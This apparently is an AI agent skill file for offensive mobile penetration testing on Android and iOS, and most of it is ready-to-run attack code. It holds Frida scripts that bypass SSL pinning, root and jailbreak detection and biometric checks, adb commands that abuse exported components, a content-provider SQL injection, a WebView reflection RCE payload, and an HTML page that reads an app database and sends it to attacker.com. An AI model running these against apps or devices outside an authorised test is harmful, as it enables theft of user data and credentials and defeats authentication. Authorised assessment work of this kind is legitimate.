---
name: mobile-pentest
description: Mobile application penetration testing — Android/iOS static/dynamic analysis, Frida instrumentation, SSL pinning bypass, root/jailbreak detection bypass, deep-link abuse, exported components, insecure storage, biometric bypass
metadata:
  type: offensive
  phase: exploitation
  platforms: android, ios
---

# Mobile Application Penetration Testing

## When to Activate

- Mobile app security assessment (Android/iOS)
- Bug bounty mobile triage
- App store reconnaissance
- Mobile malware/RAT analysis

## Lab Setup

### Android
- Rooted device or **Genymotion** / Android Studio AVD with `userdebug` build
- **Magisk** for systemless root
- **LSPosed** for Xposed modules
- **Frida server** matching device architecture
- **Burp / Mitmproxy** with system-trusted CA via Magisk module (`MagiskTrustUserCerts`)

### iOS
- Jailbroken device (palera1n / checkra1n / Dopamine depending on iOS version)
- **Frida** + **Objection** + **Filza** + **SSH via USB** (iproxy 2222 22)
- Burp CA installed via Settings → General → Device Management → Certificate Trust Settings

## Static Analysis

### Android

```bash
# Decode resources + smali
apktool d app.apk -o app_decoded

# Decompile to Java
jadx -d app_src app.apk

# Manifest review
xmllint --format app_decoded/AndroidManifest.xml | less
# Look for:
# - android:exported="true" (attack surface)
# - intent-filters (deep links)
# - custom permissions
# - android:debuggable="true"
# - android:allowBackup="true"
# - networkSecurityConfig

# Secrets and endpoints
grep -rE '(https?://[a-z0-9.-]+|api[_-]?key|secret|token|firebase|amazonaws|appspot)' app_src/
grep -r "Log\.[dwief]" app_src/   # leftover debug logs

# Native libraries
file app_decoded/lib/*/*.so
# Reverse engineer in Ghidra/IDA; look for JNI_OnLoad and Java_* functions
```

### iOS

```bash
# Pull IPA from device
frida-ios-dump -o app.ipa "com.vendor.app"

# Decrypt if needed (jailbroken device)
bagbak com.vendor.app

# Extract
unzip app.ipa

# Class dump
class-dump-dyld -H Payload/App.app/App -o headers/
# Or for Swift: use Hopper / IDA

# Strings / endpoints
strings -a Payload/App.app/App | grep -E '(https?://|key|secret|api)'

# Info.plist analysis
plutil -p Payload/App.app/Info.plist
# Look for:
# - NSAppTransportSecurity exceptions
# - CFBundleURLTypes (URL schemes)
# - associated-domains entitlements
# - UIFileSharingEnabled
```

## Dynamic Analysis & Frida

### SSL Pinning Bypass

```javascript
// Android — Universal bypass (OkHttp/CertificatePinner/TrustManager)
Java.perform(() => {
  const X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  const SSLContext = Java.use('javax.net.ssl.SSLContext');
  
  const TrustManager = Java.registerClass({
    name: 'com.sensepost.test.TrustManager',
    implements: [X509TrustManager],
    methods: {
      checkClientTrusted(chain, authType) {},
      checkServerTrusted(chain, authType) {},
      getAcceptedIssuers() { return []; }
    }
  });
  
  const TrustManagers = [TrustManager.$new()];
  const SSLContext_init = SSLContext.init.overload(
    '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom'
  );
  SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
    SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
  };
});

// iOS — Bypass SSL pinning
const SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');
Interceptor.replace(SecTrustEvaluate, new NativeCallback((trust, result) => {
  result.writeU32(1); // kSecTrustResultProceed
  return 0; // errSecSuccess
}, 'int', ['pointer', 'pointer']));
```

### Root/Jailbreak Detection Bypass

```javascript
// Android — Bypass root detection
Java.perform(() => {
  const File = Java.use('java.io.File');
  File.exists.implementation = function () {
    const path = this.getAbsolutePath();
    if (path.includes('su') || path.includes('Magisk') || path.includes('magisk')) {
      return false;
    }
    return this.exists();
  };
  
  // RootBeer library bypass
  const RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
  RootBeer.isRooted.implementation = () => false;
});

// iOS — Bypass jailbreak detection
const stat = Module.findExportByName(null, 'stat');
Interceptor.attach(stat, {
  onEnter(args) {
    const path = args[0].readUtf8String();
    if (/Cydia|jailbreak|substrate|frida|sileo/i.test(path)) {
      args[0] = Memory.allocUtf8String('/nonexistent');
    }
  }
});

const fopen = Module.findExportByName(null, 'fopen');
Interceptor.attach(fopen, {
  onEnter(args) {
    const path = args[0].readUtf8String();
    if (/Cydia|jailbreak/i.test(path)) {
      args[0] = Memory.allocUtf8String('/nonexistent');
    }
  }
});
```

### Objection (Frida-based shortcuts)

```bash
# Android
objection -g com.app.package explore
android hooking watch class com.app.MainActivity
android hooking list activities
android intent launch_activity com.app.SecretActivity
android sslpinning disable

# iOS
objection -g com.app.bundle explore
ios hooking watch class ViewController
ios sslpinning disable
ios jailbreak disable
ios keychain dump
```

## Exported Components (Android)

### Attack Surface Enumeration

```bash
# List exported components
adb shell dumpsys package com.app.package | grep -A 5 "android.intent.action"

# Or from manifest:
grep -E 'android:exported="true"|intent-filter' AndroidManifest.xml
```

### Activity Exploitation

```bash
# Launch exported activity directly
adb shell am start -n com.app.package/.SecretActivity

# With extras
adb shell am start -n com.app.package/.WebViewActivity \
  --es url "file:///data/data/com.app.package/databases/secrets.db"
```

### Service Exploitation

```bash
# Start exported service
adb shell am startservice -n com.app.package/.VulnerableService

# Send intent with data
adb shell am startservice -n com.app.package/.CommandService \
  --es command "cat /data/data/com.app.package/shared_prefs/secrets.xml"
```

### Broadcast Receiver

```bash
# Send broadcast
adb shell am broadcast -a com.app.package.CUSTOM_ACTION \
  --es data "malicious_payload"
```

### Content Provider

```bash
# Query content provider
adb shell content query --uri content://com.app.package.provider/users

# Insert
adb shell content insert --uri content://com.app.package.provider/users \
  --bind username:s:admin --bind password:s:hacked

# SQL injection in content provider
adb shell content query --uri "content://com.app.package.provider/users?id=1' OR '1'='1"
```

## Deep Links & URL Schemes

### Android Deep Links

```bash
# Test deep link
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://secret/admin?token=stolen"

# Common vulnerabilities:
# - No validation of parameters
# - Path traversal: myapp://file?path=../../../etc/passwd
# - Open redirect: myapp://redirect?url=https://attacker.com
# - XSS in WebView: myapp://webview?url=javascript:alert(1)
```

### iOS URL Schemes

```bash
# Test URL scheme
xcrun simctl openurl booted "myapp://secret/admin?token=stolen"

# Or via Safari: myapp://action?param=value
# Or via Shortcuts app for automation
```

## Insecure Data Storage

### Android

```bash
# Shared Preferences (often world-readable)
adb shell cat /data/data/com.app.package/shared_prefs/*.xml

# SQLite databases
adb pull /data/data/com.app.package/databases/
sqlite3 app.db "SELECT * FROM users;"

# Internal storage
adb shell ls -la /data/data/com.app.package/files/

# External storage (world-readable)
adb shell ls /sdcard/Android/data/com.app.package/

# Keystore misuse — check if keys are hardware-backed
# If not, extractable via root
```

### iOS

```bash
# NSUserDefaults
cat /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/com.app.bundle.plist

# Keychain (requires jailbreak + keychain-dumper)
keychain_dumper -a

# Files
ls -la /var/mobile/Containers/Data/Application/<UUID>/Documents/
ls -la /var/mobile/Containers/Data/Application/<UUID>/Library/
```

## WebView Vulnerabilities

### Android JavaScriptInterface

```java
// Vulnerable code:
webView.addJavascriptInterface(new JSBridge(), "JSBridge");

// Exploit from loaded HTML:
<script>
JSBridge.getClass().forName('java.lang.Runtime')
  .getMethod('exec', String).invoke(
    JSBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),
    'id'
  )
</script>
```

### file:// Access

```bash
# If setAllowFileAccessFromFileURLs(true)
# Load malicious HTML that reads local files
adb shell am start -n com.app/.WebViewActivity \
  --es url "file:///sdcard/malicious.html"

# malicious.html:
<script>
fetch('file:///data/data/com.app.package/databases/secrets.db')
  .then(r => r.text())
  .then(data => fetch('https://attacker.com/exfil?data=' + btoa(data)));
</script>
```

## Biometric Bypass

### Android BiometricPrompt

```javascript
// Bypass if app doesn't bind crypto operation to biometric
Java.perform(() => {
  const Callback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
  Callback.onAuthenticationSucceeded.implementation = function (result) {
    console.log('[+] Biometric bypassed');
    return this.onAuthenticationSucceeded(result);
  };
  Callback.onAuthenticationFailed.implementation = function () {
    console.log('[+] Ignoring auth failure');
  };
});
```

### iOS LAContext

```javascript
// Bypass if app trusts boolean result without Keychain-bound key
const LAContext = ObjC.classes.LAContext;
Interceptor.attach(LAContext['- evaluatePolicy:localizedReason:reply:'].implementation, {
  onEnter(args) {
    const block = new ObjC.Block(args[4]);
    const original = block.implementation;
    block.implementation = function(success, error) {
      console.log('[+] Biometric bypassed');
      original.call(this, true, NULL);
    };
  }
});
```

## Firebase / Cloud Misconfig

```bash
# Firebase Realtime DB (check for open read/write)
curl https://app-name.firebaseio.com/.json

# If returns data → no auth required
# Test write:
curl -X PUT -d '{"hacked":true}' https://app-name.firebaseio.com/test.json

# Firestore (check rules)
# Look for: allow read, write: if true;

# AWS S3 buckets (from app strings)
aws s3 ls s3://bucket-name --no-sign-request
```

## API Testing

```bash
# Intercept API calls via Burp
# Test for:
# - IDOR: change user_id parameter
# - Mass assignment: add "role":"admin" to JSON
# - Rate limiting bypass
# - JWT manipulation (alg:none, weak secret)
# - GraphQL introspection
# - Excessive data exposure
```
